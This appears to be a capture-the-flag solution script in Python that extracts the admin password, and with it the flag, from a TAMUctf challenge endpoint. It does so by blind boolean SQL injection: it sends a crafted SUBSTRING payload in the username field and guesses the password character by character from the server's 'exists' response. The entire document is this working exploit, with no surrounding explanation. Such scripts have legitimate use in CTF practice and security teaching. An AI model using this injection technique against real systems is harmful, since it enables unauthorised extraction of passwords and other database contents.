import requests
import string

s = requests.Session()

alphabet = '}-_' + string.digits + string.ascii_letters
flag = 'gigem{'

while not flag.endswith('}'):

    for c in alphabet:

        r = s.post('http://logical.tamuctf.com/api/chpass', data = {
            'username': f"admin' AND SUBSTRING(password, 1, {len(flag) + 1})='{flag + c}"
        })
        
        if r.json()['res'] == 'exists':
            flag += c
            print(flag)
            break